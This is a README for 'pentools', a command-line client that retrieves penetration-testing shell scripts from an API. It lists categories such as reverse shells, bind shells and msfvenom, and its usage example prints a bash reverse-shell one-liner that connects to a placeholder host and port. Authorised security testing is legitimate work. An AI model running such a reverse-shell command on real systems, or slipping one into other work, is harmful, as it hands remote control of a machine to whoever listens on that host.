## CLI Tool for interacting with Pen Tools API.
A command line interface tool for interacting with Pen Tools API. Quickly retrieve and format scripts using a simple set of commands.
### Installation 
**The package requires Python 3.7 or higher**.

Install latest version from [PyPI](https://pypi.org/project/pentools/): ```pip install pentools``` 

### Resources
[API documentation](https://pentools.herokuapp.com/docs)
### Usage
Retrieve the list of scripts based on specified category (leave blank to see all).

```
pentools list
```
*output:*
```
Available types

0. rev
1. bind
2. msf_venom
3. listener
```

Add the ```-f``` flag to see available scripts.

```
pentools list rev  -f
```
*output:*
```
Available scripts and types

0. rev
    Shell session established on a connection that is initiated from a remote machine.
        0. bash_i [id: 1]('linux', 'mac')
        1. bash_196 [id: 2]('linux', 'mac')
        2. bash_read_line [id: 3]('linux', 'mac')
        3. Bash_5 [id: 4]('linux', 'mac')
        ...
```

Retrieve and format a specific script by id.

```
pentools script -i 1 -ho example.ip -p 12345 -s bin/bash
```
*output:*
```
---------------(code)---------------

bin/bash -i >& /dev/tcp/example.ip/12345 0>&1

-------------(end code)-------------
```


        


